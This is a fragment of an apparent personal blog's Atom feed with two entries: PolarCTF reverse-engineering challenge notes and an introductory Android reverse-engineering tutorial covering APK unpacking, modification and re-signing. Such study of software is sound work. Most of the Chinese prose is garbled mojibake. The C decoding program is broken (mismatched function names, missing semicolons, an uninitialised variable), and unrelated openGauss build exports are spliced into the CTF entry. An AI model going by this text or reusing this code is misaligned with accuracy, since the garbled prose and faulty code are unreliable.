    
    <category term="VM RE" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/VM-RE/"/>
    
  </entry>
  
  <entry>
    <title>PolarCTF</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/03/25/PolarCTF2024%E6%98%A5/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/03/25/PolarCTF2024%E6%98%A5/</id>
    <published>2024-03-24T16:00:00.000Z</published>
    <updated>2024-09-16T07:15:04.178Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PolarCTF"><a href="#PolarCTF" class="headerlink" title="PolarCTF"></a>PolarCTF</h1><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="app-login"><a href="#app-login" class="headerlink" title="app_login"></a>app_login</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">flag = <span class="string">&#x27;zhishixuebao&#x27;</span></span><br><span class="line">x = hashlib.md5(flag.encode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">y = x.hexdigest()</span><br><span class="line"><span class="built_in">print</span>(y)</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(y),<span class="number">2</span>):</span><br><span class="line">    flag+=y[i]</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">flagg=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">    t=((<span class="number">255</span>-i)+<span class="number">2</span>)-<span class="number">98</span>-<span class="number">48</span></span><br><span class="line">    flagg+=<span class="built_in">chr</span>(t)</span><br><span class="line"><span class="built_in">print</span>(flagg)</span><br></pre></td></tr></table></figure><h3 id="kr"><a href="#kr" class="headerlink" title="kr"></a>kr</h3><p>ï¼Ÿï¼Ÿï¼ŸwinhexåŠ¨æ€è°ƒè¯•</p><p>ä½†æ˜¯æ²¡æ‰¾åˆ°krï¼Œæˆ‘ç”¨çš„x32dbg</p><p>ï¼Œï¼Œï¼Ÿå› ä¸ºupxè„±ä¸äº†å£³å„¿ï¼Œä¼šæ˜¾ç¤º999ï¼ˆ3e7),å’Œåç§»é‡</p><p>ç„¶åä»åç§»é‡å’Œ999æ‰¾æŒ‡ä»¤ï¼Œç„¶åe703å˜æˆe713ï¼ˆï¼Ÿ</p><p>ç»§ç»­è¿è¡Œå¯ä»¥å¾—åˆ°ï¼Ÿ<br>è¿™æ˜¯åœ¨å¹²ä»€ä¹ˆ</p><h3 id="çŒœçŒœæˆ‘åœ¨å“ªå„¿"><a href="#çŒœçŒœæˆ‘åœ¨å“ªå„¿" class="headerlink" title="çŒœçŒœæˆ‘åœ¨å“ªå„¿"></a>çŒœçŒœæˆ‘åœ¨å“ªå„¿</h3><p>åŸºæœ¬ä¹Ÿå°±æ˜¯è‡ªåŠ å¯†é€†å‘</p><p>åŸå­—ç¬¦flagç»è¿‡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; input[i]; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    ch_0 = input[i];</span><br><span class="line">    <span class="keyword">if</span> ( ch_0 &lt;= <span class="number">96</span> || ch_0 &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( ch_0 &gt; <span class="number">64</span> &amp;&amp; ch_0 &lt;= <span class="number">90</span> )</span><br><span class="line">        ch_0 = (ch_0 - <span class="number">65</span> + key) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ch_0 = (ch_0 - <span class="number">97</span> + key) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    result[i] = ch_0;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœkey&#x3D;&#x3D;111ï¼Œå˜æˆ48</p><p>å˜æˆkhb i0dj lv qrw khuh</p><p>é€†å‘ï¼š</p><p>khb i0dj lv qrw khuh</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> *<span class="title function_">encrypto</span><span class="params">(<span class="type">char</span> *input,<span class="type">int</span> key)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> s[]=<span class="string">&quot;khb i0dj lv qrw khuh&quot;</span>;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="built_in">strlen</span>(s);++i)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="number">48</span>)s[i]=<span class="number">111</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">0</span>;k&lt;<span class="number">5</span>;++k)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,encrypto(s,k));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> *encrypt(<span class="type">char</span> *input,<span class="type">int</span> key)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *result;</span><br><span class="line">    <span class="type">char</span> ch_0;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    </span><br><span class="line">    result = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">100</span>);</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;input[i];++i)&#123;</span><br><span class="line">       <span class="keyword">if</span> ( ch_0 &lt;= <span class="number">96</span> || ch_0 &gt; <span class="number">122</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( ch_0 &gt; <span class="number">64</span> &amp;&amp; ch_0 &lt;= <span class="number">90</span> )</span><br><span class="line">        ch_0 = (ch_0 - <span class="number">65</span> + key+<span class="number">26</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ch_0 = (ch_0 - <span class="number">97</span> - key+<span class="number">26</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    result[i]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ˜“ä½"><a href="#æ˜“ä½" class="headerlink" title="æ˜“ä½"></a>æ˜“ä½</h3><p>å¤ªæŠ½è±¡äº†ï¼Œï¼Œç”¨è¿™è¾¹çš„è§£å¯†é‚£è¾¹çš„å­—ç¬¦ï¼Œç”¨é‚£è¾¹çš„è§£å¯†è¿™è¾¹çš„å­—ç¬¦</p><h3 id="C"><a href="#C" class="headerlink" title="C^"></a>C^</h3><p>å¥½åƒä¹Ÿæ˜¯å¼‚æˆ–1ï¼Œç®€å•çš„</p><h3 id="ä¸€ä¸ªflagæˆªä¸‰æ®µ"><a href="#ä¸€ä¸ªflagæˆªä¸‰æ®µ" class="headerlink" title="ä¸€ä¸ªflagæˆªä¸‰æ®µ"></a>ä¸€ä¸ªflagæˆªä¸‰æ®µ</h3><p>å­—é¢æ„æ€ï¼Œæ‰“å¼€IDA</p><p>ï¼ˆæˆ‘çœ‹wpä¼¼ä¹æ˜¯peæ–‡ä»¶æŸåä¿®å¤ï¼Ÿ</p><p>export CODE_BASE&#x3D;&#x2F;home&#x2F;dblab&#x2F;opengauss-compile&#x2F;openGauss-server-v3.0.0 # Path of the openGauss-server file</p><p>export BINARYLIBS&#x3D;$CODE_BASE&#x2F;..&#x2F;binarylibs-v3.0.0</p><p>export GAUSSHOME&#x3D;$CODE_BASE&#x2F;dest</p><p>export GCC_PATH&#x3D;$BINARYLIBS&#x2F;buildtools&#x2F;openeuler_aarch64&#x2F;gcc7.3</p><p>export CC&#x3D;$GCC_PATH&#x2F;gcc&#x2F;bin&#x2F;gcc</p><p>export CXX&#x3D;$GCC_PATH&#x2F;gcc&#x2F;bin&#x2F;g++</p><p>export D_LIBRARY_PATH&#x3D;$GAUSSHOME&#x2F;lib:$GCC_PATH&#x2F;gcc&#x2F;lib64:$GCC_PATH&#x2F;isl&#x2F;lib:$GCC_PATH&#x2F;mpc&#x2F;lib&#x2F;:$GCC_PATH&#x2F;mpfr&#x2F;lib&#x2F;:$GCC_PATH&#x2F;gmp&#x2F;lib&#x2F;:$LD_LIBRARY_PATH</p><p>export PATH&#x3D;$GAUSSHOME&#x2F;bin:$GCC_PATH&#x2F;gcc&#x2F;bin:$PATH</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;PolarCTF&quot;&gt;&lt;a href=&quot;#PolarCTF&quot; class=&quot;headerlink&quot; title=&quot;PolarCTF&quot;&gt;&lt;/a&gt;PolarCTF&lt;/h1&gt;&lt;h2 id=&quot;Reverse&quot;&gt;&lt;a href=&quot;#Reverse&quot; class=&quot;header</summary>
      
    
    
    
    
    <category term="CTF" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Androidé€†å‘</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/03/18/Android%E9%80%86%E5%90%91/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/03/18/Android%E9%80%86%E5%90%91/</id>
    <published>2024-03-17T16:00:00.000Z</published>
    <updated>2024-09-16T07:14:09.131Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Androidé€†å‘"><a href="#Androidé€†å‘" class="headerlink" title="Androidé€†å‘"></a>Androidé€†å‘</h1><h2 id="AndroidåŸºç¡€çŸ¥è¯†"><a href="#AndroidåŸºç¡€çŸ¥è¯†" class="headerlink" title="AndroidåŸºç¡€çŸ¥è¯†"></a>AndroidåŸºç¡€çŸ¥è¯†</h2><h3 id="ç³»ç»Ÿæ¶æ„"><a href="#ç³»ç»Ÿæ¶æ„" class="headerlink" title="ç³»ç»Ÿæ¶æ„"></a>ç³»ç»Ÿæ¶æ„</h3><p>å®‰å“ï¼ˆAndroidï¼‰æ˜¯ä¸€ç§åŸºäºLinuxå†…æ ¸ï¼ˆä¸åŒ…å«GNUç»„ä»¶ï¼‰çš„è‡ªç”±åŠå¼€æ”¾æºä»£ç çš„æ“ä½œç³»ç»Ÿã€‚ä¸»è¦ä½¿ç”¨äºç§»åŠ¨è®¾å¤‡ï¼Œå¦‚æ™ºèƒ½æ‰‹æœºå’Œå¹³æ¿ç”µè„‘ï¼Œç”±ç¾å›½Googleå…¬å¸å’Œå¼€æ”¾æ‰‹æœºè”ç›Ÿé¢†å¯¼åŠå¼€å‘ã€‚</p><p>androidæ¡†æ¶ï¼š<img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240307112450236.png" alt="image-20240307112450236"></p><p> ä»ä¸‹å¾€ä¸Šåˆ†åˆ«æ˜¯ï¼šLinuxå†…æ ¸å±‚ã€ç³»ç»Ÿè¿è¡Œåº“å±‚ï¼ˆç¨‹åºåº“+androidè¿è¡Œåº“ï¼‰ã€åº”ç”¨ç¨‹åºæ¡†æ¶å±‚ã€åº”ç”¨å±‚ã€‚</p><p><strong>Linuxå†…æ ¸å±‚ï¼š</strong> Android ç³»ç»Ÿæ˜¯åŸºäº Linux å†…æ ¸çš„,å®ƒæä¾›äº†åŸºæœ¬çš„ç³»ç»ŸåŠŸèƒ½åŠä¸ç¡¬ä»¶äº¤äº’çš„é©±åŠ¨ï¼Œåƒå›¾ä¸­Display Driverï¼ˆæ˜¾ç¤ºé©±åŠ¨ï¼‰ã€Camera Driverï¼ˆæ‘„åƒå¤´é©±åŠ¨ï¼‰ã€WiFi Driverï¼ˆWiFié©±åŠ¨ï¼‰ç­‰</p><p><strong>ç³»ç»Ÿè¿è¡Œåº“å±‚ï¼š</strong> åƒå›¾ä¸­å†…æ ¸çš„ä¸Šä¸€å±‚å°±æ˜¯ç³»ç»Ÿè¿è¡Œåº“å±‚ï¼Œç¨‹åºåº“ï¼ˆç»¿è‰²éƒ¨åˆ†ï¼‰ å’Œ Androidè¿è¡Œåº“ï¼ˆé»„è‰²éƒ¨åˆ†ï¼‰ ç»„æˆã€‚</p><ul><li><p>Librariesï¼ˆç¨‹åºåº“ï¼‰ï¼š ç”± Cã€C++ ç¼–å†™ï¼Œä¸€ç³»åˆ—ç¨‹åºåº“çš„é›†åˆï¼Œä¾› Android ç³»ç»Ÿçš„å„ä¸ªç»„ä»¶ä½¿ç”¨ã€‚</p></li><li><p>Android runtimeï¼ˆCore Librares + Dalvikè™šæ‹Ÿæœºï¼‰ï¼š ç¿»è¯‘è¿‡æ¥å°±æ˜¯ Android è¿è¡Œæ—¶ï¼ŒAndroid åº”ç”¨ç¨‹åºæ—¶é‡‡ç”¨ Java è¯­è¨€ç¼–å†™ï¼Œç¨‹åºåœ¨Androidè¿è¡Œæ—¶ä¸­æ‰§è¡Œï¼Œå…¶è¿è¡Œæ—¶åˆ†ä¸ºæ ¸å¿ƒåº“ å’Œ Dalvikè™šæ‹Ÿæœº ä¸¤éƒ¨åˆ†ã€‚</p></li></ul><p><strong>Application Frameworkï¼ˆåº”ç”¨ç¨‹åºæ¡†æ¶å±‚ï¼‰</strong>ï¼š è¿™ä¸€å±‚ä¸»è¦æ˜¯æä¾›ä¸€äº›ç»„ä»¶ï¼Œæ­å»ºæ¡†æ¶ï¼Œæ–¹ä¾¿app å¼€å‘äººç”¨å†æ¬¡åŸºç¡€ä¸Šå¿«é€Ÿå¼€å‘å¼€å‘åº”ç”¨ç¨‹åºã€‚è€Œå®é™…ä¸Šå°±æ˜¯ä¸€äº› Android APIã€‚</p><p><strong>Applicationsï¼ˆåº”ç”¨å±‚</strong>ï¼‰ï¼šé¡¶å±‚ä¸­æœ‰æ‰€æœ‰çš„ Android åº”ç”¨ç¨‹åºï¼Œå¦‚æ‰‹æœºä¸­çš„ï¼šç”µè¯ã€æ–‡ä»¶ç®¡ç†ã€ä¿¡æ¯ç­‰ã€‚</p><h3 id="è™šæ‹Ÿæœº"><a href="#è™šæ‹Ÿæœº" class="headerlink" title="è™šæ‹Ÿæœº"></a><strong>è™šæ‹Ÿæœº</strong></h3><h4 id="Dalvik-è™šæ‹Ÿæœº"><a href="#Dalvik-è™šæ‹Ÿæœº" class="headerlink" title="Dalvik è™šæ‹Ÿæœº"></a><strong>Dalvik</strong> <strong>è™šæ‹Ÿæœº</strong></h4><p>Dalvik æ˜¯ google ä¸“é—¨ä¸º Android æ“ä½œç³»ç»Ÿè®¾è®¡çš„ä¸€ä¸ªè™šæ‹Ÿæœºï¼Œç®€ç§°DVM<strong>ã€‚</strong>åœ¨ Android 4.4åŠä»¥å‰çš„ç‰ˆæœ¬ï¼Œ æ‰€æœ‰çš„ Android ç¨‹åºéƒ½æ˜¯åœ¨ Dalvik è™šæ‹Ÿæœºç¯å¢ƒä¸‹å»è¿è¡Œçš„ã€‚DVM çš„æŒ‡ä»¤æ˜¯<strong>åŸºäºå¯„å­˜å™¨</strong>çš„ï¼Œè¿è¡Œçš„æ˜¯ç»è¿‡è½¬æ¢çš„ <strong>.dex****æ–‡ä»¶</strong> ï¼ˆ.dex æ˜¯ä¸“ä¸º Dalvik è®¾è®¡çš„ä¸€ç§å‹ç¼©æ ¼å¼ï¼Œé€‚åˆå†…å­˜å’Œå¤„ç†å™¨é€Ÿåº¦æœ‰é™çš„ç³»ç»Ÿï¼‰ï¼ŒDalvik è™šæ‹Ÿæœºæ¯æ¬¡åº”ç”¨è¿è¡Œçš„æ—¶å€™ï¼Œå°†ä»£ç ç¼–è¯‘æˆæœºå™¨è¯­è¨€æ‰§è¡Œã€‚</p><h4 id="ART-è™šæ‹Ÿæœº"><a href="#ART-è™šæ‹Ÿæœº" class="headerlink" title="ART è™šæ‹Ÿæœº"></a><strong>ART</strong> <strong>è™šæ‹Ÿæœº</strong></h4><p>å‰é¢è¯´åˆ°ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨æ‰‹æœºæ¯è¿è¡Œä¸€ä¸ªç¨‹åºï¼ŒDalvik è™šæ‹Ÿæœºéƒ½ä¼šäº§ç”Ÿä¸€ä¸ªå®ä¾‹ï¼Œäº’ä¸å½±å“ï¼Œè¿™å°±å¯èƒ½ä¼šå‡ºç°å ç”¨èµ„æºè¿‡å¤šç­‰é—®é¢˜ï¼Œéšç€äººä»¬æ—¥ç›Šå¢é•¿çš„éœ€æ±‚ï¼ŒDalvik æ— æ³•æ»¡è¶³äººä»¬å¯¹è½¯ä»¶è¿è¡Œæ•ˆç‡çš„éœ€è¦ã€‚è¿™æ˜¯å°±è¯ç”Ÿäº† ART è™šæ‹Ÿæœºã€‚</p><p>åœ¨ <strong>Android4.4</strong> <strong>åŠä»¥ä¸Šç‰ˆæœ¬</strong>ï¼Œåº”è¿è€Œç”Ÿçš„ ART è™šæ‹Ÿæœºæ›¿ä»£äº† Dalvik è™šæ‹Ÿæœºï¼Œå…¶å¤„ç†æœºåˆ¶æ ¹æœ¬ä¸Šçš„åŒºåˆ«æ˜¯å®ƒé‡‡ç”¨AOT(Ahead of TIme) æŠ€æœ¯ï¼Œ<strong>ä¼šåœ¨åº”ç”¨ç¨‹åºå®‰è£…æ—¶å°±è½¬æ¢æˆæœºå™¨è¯­è¨€ï¼Œä¸å†åœ¨æ‰§è¡Œæ—¶è§£é‡Š</strong>ï¼Œä»è€Œä¼˜åŒ–äº†åº”ç”¨è¿è¡Œçš„é€Ÿåº¦ã€‚åœ¨å†…å­˜ç®¡ç†æ–¹é¢ï¼ŒART ä¹Ÿæœ‰æ¯”è¾ƒå¤§çš„æ”¹è¿›ï¼Œå¯¹å†…å­˜åˆ†é…å’Œå›æ”¶éƒ½åšäº†ç®—æ³•ä¼˜åŒ–ï¼Œé™ä½äº†å†…å­˜ç¢ç‰‡åŒ–ç¨‹åº¦ï¼Œå›æ”¶æ—¶é—´ä¹Ÿå¾—ä»¥ç¼©çŸ­ã€‚</p><p><strong>DVM</strong> <strong>ä¸</strong> <strong>ART</strong> <strong>çš„åŒºåˆ«ï¼š</strong> è™½è¯´ ART æ›¿æ¢äº† Dalvik è™šæ‹Ÿæœºï¼Œå¹¶ä¸æ„å‘³ç€ï¼Œå…¶åº”ç”¨ç¨‹åºå¼€å‘ä¸Šä¹Ÿè¦å‘ç”Ÿæ”¹å˜ï¼Œåƒ android åº”ç”¨ç¨‹åºå®‰è£…åŒ…ï¼ˆapkï¼‰ä¸­ï¼Œä»ç„¶è¿˜æ˜¯å¯æ‰§è¡Œçš„ .dex æ–‡ä»¶ã€‚</p><h3 id="Apk-ç¼–è¯‘æµç¨‹"><a href="#Apk-ç¼–è¯‘æµç¨‹" class="headerlink" title="Apk ç¼–è¯‘æµç¨‹"></a><strong>Apk</strong> <strong>ç¼–è¯‘æµç¨‹</strong></h3><p><img src="C:\Users\17687\AppData\Roaming\Typora\typora-user-images\image-20240307124845628.png" alt="image-20240307124845628"></p><h3 id="æ­£å‘å¼€å‘"><a href="#æ­£å‘å¼€å‘" class="headerlink" title="æ­£å‘å¼€å‘"></a><strong>æ­£å‘å¼€å‘</strong></h3><p>é¦–å…ˆæˆ‘ä»¬æ¥å†™ä¸€ä¸ª appï¼Œå¹¶æ‰“åŒ…æˆ apkã€‚åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥æ¥è§¦åˆ°å¾ˆå¤šå®‰å“é€†å‘ä¸­ä¼šé‡åˆ°çš„æ¦‚</p><p>å¿µã€‚</p><p>ä¸€ä¸ª app å¯ä»¥ç†è§£ä¸ºç”±ä¸‰ä¸ªåŸºæœ¬å…ƒä»¶æ„æˆï¼š</p><ol><li><p>AndroidManifest.xmlï¼šå¯ä»¥æƒ³æˆæ˜¯ app çš„é…ç½®æ–‡ä»¶</p></li><li><p>resourcesï¼šå„ç§èµ„æºï¼ŒåŒ…æ‹¬æ’ç‰ˆã€ä»£ç ä¸­å‡ºç°çš„å­—ç¬¦ä¸²ã€å›¾ç‰‡ç­‰</p></li><li><p>ä»£ç ï¼šUI ç•Œé¢åŠé€»è¾‘ä»£ç </p></li></ol><p>ä¸‹é¢æ˜¯ä¸€ä¸ªç®€å•çš„ demoï¼Œå·¦è¾¹æ˜¯é¡¹ç›®æ ‘ï¼Œå³è¾¹æ˜¯ AndroidManifest.xml çš„å…§å®¹ï¼š</p><p>ä»è¿™ä¸ªé…ç½®æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼š</p><ol><li><p>è¿™ä¸ª app çš„åŒ…åï¼ˆpackage nameï¼‰æ˜¯ com.example.demo</p></li><li><p>è¿™ä¸ª app é‡Œæœ‰ä¸€ä¸ªçª—ä½“ï¼ˆactivityï¼‰ï¼Œåå­—ä¸º MainActivity ï¼Œæ˜¯ç¨‹åºå…¥å£çª—ä½“</p></li></ol><p>ä»€ä¹ˆæ˜¯ activity å‘¢ï¼Ÿä½ å¯ä»¥æŠŠ activity ç†è§£æˆæ˜¯ä¸€ä¸ªç•Œé¢ï¼Œæ¯ä¸ªç¨‹åºç•Œé¢å¯¹åº”ä¸€ä¸ª activityã€‚å‡è®¾ appæ˜¯ä¸ªéœ€è¦æ³¨å†Œæ‰èƒ½ä½¿ç”¨çš„åº”ç”¨ï¼Œåˆ™å¯èƒ½æœ‰ä»¥ä¸‹ç•Œé¢ï¼š</p><ul><li><p>æ¬¢è¿ç•Œé¢</p></li><li><p>æ³¨å†Œç•Œé¢</p></li><li><p>ç™»å½•ç•Œé¢</p></li><li><p>ä¸»ç•Œé¢</p></li></ul><p>è€Œè¿™æ¯ä¸€ä¸ªç•Œé¢éƒ½æ˜¯ä¸€ä¸ª activityï¼Œè€Œæ¯ä¸€ä¸ª activity å¯èƒ½éƒ½æœ‰ä¸€ä¸ª layoutã€‚åœ¨ Android å¼€å‘ä¸­ï¼Œlayout å…¶å®å°±æ˜¯ä¸€ä¸ª xml æ–‡æ¡£ï¼Œåƒè¿™æ ·ï¼š</p><p>åƒ layout å°±å±äºèµ„æºæ–‡ä»¶çš„ä¸€ç§ï¼Œä¼šè¢«æ”¾åˆ° res æ–‡ä»¶å¤¹ä¸‹ã€‚</p><p>ä¸Šå›¾ä¸­æœ‰ä¸¤ç‚¹éœ€è¦æ³¨æ„ï¼Œä¸€æ˜¯ android:id&#x3D;â€@+id&#x2F;textview_firstâ€ ä»£è¡¨è¿™ä¸ªç»„ä»¶å¯¹åº”åˆ°ä¸€ä¸ª idã€‚æ‰èƒ½åœ¨ä»£ç é‡Œé€šè¿‡ id æ‹¿åˆ°è¿™ä¸ªç»„ä»¶ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">TextView tv = (TextView) findViewById(R.id.textview_first);</span><br><span class="line"></span><br><span class="line">tv.setText(&quot;hello&quot;);</span><br></pre></td></tr></table></figure><p>ç¬¬äºŒä¸ªå€¼å¾—æ³¨æ„çš„åœ°æ–¹æ˜¯ android:text&#x3D;â€@string&#x2F;hello_first_fragmentâ€ ï¼Œè¿™å…¶å®å°±æ˜¯ç»„ä»¶ä¼šæ˜¾ç¤ºçš„æ–‡å­—ï¼Œå¯¹åº”åˆ° res&#x2F;values&#x2F;strings.xml ï¼š</p><p>åˆ©ç”¨è¿™æ ·çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥é¿å…ç›´æ¥åœ¨ layout é‡Œå†™æ­»å­—ç¬¦ä¸²ï¼Œè¿™æ ·å°±å¯ä»¥åšæˆæ”¯æŒå¤šå›½è¯­è¨€çš„ appã€‚</p><p><strong>æ‹†åŒ…ä¸é‡æ‰“åŒ…</strong></p><p>ä¸Šé¢çš„ç¨‹åºç¼–è¯‘æˆ apk åï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒçš„åç¼€æ”¹æˆ .zip ç›´æ¥è§£å‹ï¼Œå¾—åˆ°è¿™æ ·çš„ç›®å½•ç»“æ„ï¼š</p><ul><li><p>META-INFï¼šå­˜æ”¾ç­¾åæ–‡ä»¶</p></li><li><p>resï¼šèµ„æºæ–‡ä»¶</p></li><li><p>AndroidManifest.xmlï¼šapp é…ç½®æ–‡ä»¶</p></li><li><p>classes.dexï¼šJava ä»£ç ç¼–è¯‘æˆ dex æ–‡ä»¶</p></li><li><p>resources.arscï¼šèµ„æºæ–‡ä»¶ç›¸å…³çš„ç´¢å¼•è¡¨</p></li></ul><p>java -jar apktool.jar d -f demo.apk</p><p>ä¿®æ”¹ res&#x2F;values&#x2F;strings.xml é‡Œçš„ hello_first_fragment ä¸º Hacked ï¼Œå†é‡æ‰“åŒ…ï¼š</p><p>java -jar apktool.jar b â€“use-aapt2 demo -o demo2.apk</p><p>æ­¤æ—¶çš„ apk è¿˜æ— æ³•å®‰è£…ï¼Œæˆ‘ä»¬éœ€è¦å¯¹å®ƒè¿›è¡Œ align å’Œ sign æ‰èƒ½åœ¨æ‰‹æœºä¸Šå®‰è£…ï¼š</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">zipalign -v -p <span class="number">4</span> demo2.apk demo2-aligned.apk</span><br><span class="line"></span><br><span class="line">keytool -genkey -v -keystore my-key.jks -keyalg RSA -keysize <span class="number">2048</span> -validity</span><br><span class="line"><span class="number">10000</span> -alias my-alias</span><br><span class="line"></span><br><span class="line">apksigner sign --ks my-key.jks --ks-pass pass:<span class="number">123456</span> --out demo2-signed.apk</span><br><span class="line">demo2-aligned.apk</span><br></pre></td></tr></table></figure><h3 id="JNI"><a href="#JNI" class="headerlink" title="JNI"></a>JNI</h3><p>JNIï¼ˆJava Native Interfaceï¼‰æ˜¯ä¸€ç§åœ¨ Java è™šæ‹Ÿæœºä¸­è°ƒç”¨æœ¬åœ°ï¼ˆNativeï¼‰æ–¹æ³•çš„æœºåˆ¶ã€‚åœ¨ Androidä¸­ï¼Œç”±äº Android åº”ç”¨æ˜¯é€šè¿‡ Java è¯­è¨€ç¼–å†™çš„ï¼Œä½†æ˜¯æŸäº›æ“ä½œç³»ç»Ÿåº•å±‚çš„åŠŸèƒ½åªèƒ½é€šè¿‡æœ¬åœ° C&#x2F;C++ ä»£ç æ¥å®ç°ï¼Œæ‰€ä»¥éœ€è¦ä½¿ç”¨ JNI æ¥å®ç°Javaä¸æœ¬åœ°ä»£ç çš„äº¤äº’ã€‚</p><p>ä½¿ç”¨ JNI å¯ä»¥è®© Java ç¨‹åºè°ƒç”¨æœ¬åœ°åº“ä¸­çš„å‡½æ•°ï¼Œè€Œæœ¬åœ°å‡½æ•°å¯ä»¥ä½¿ç”¨æ ‡å‡† C&#x2F;C++ ç¼–å†™ã€‚è¿™æ ·å¯ä»¥é€šè¿‡JNI å°† Java ç¨‹åºä¸æœ¬åœ°ä»£ç ç»„åˆåœ¨ä¸€èµ·ã€‚</p><h3 id="å¸¸ç”¨å·¥å…·"><a href="#å¸¸ç”¨å·¥å…·" class="headerlink" title="å¸¸ç”¨å·¥å…·"></a><strong>å¸¸ç”¨å·¥å…·</strong></h3><ul><li><p>adb</p></li><li><p>apksigner</p></li><li><p>Android killer</p></li><li><p>jadx</p></li><li><p>jeb</p></li></ul><h2 id="smaliè¯­æ³•"><a href="#smaliè¯­æ³•" class="headerlink" title="smaliè¯­æ³•"></a>smaliè¯­æ³•</h2><h3 id="Java-gt-smali"><a href="#Java-gt-smali" class="headerlink" title="Java -&gt; 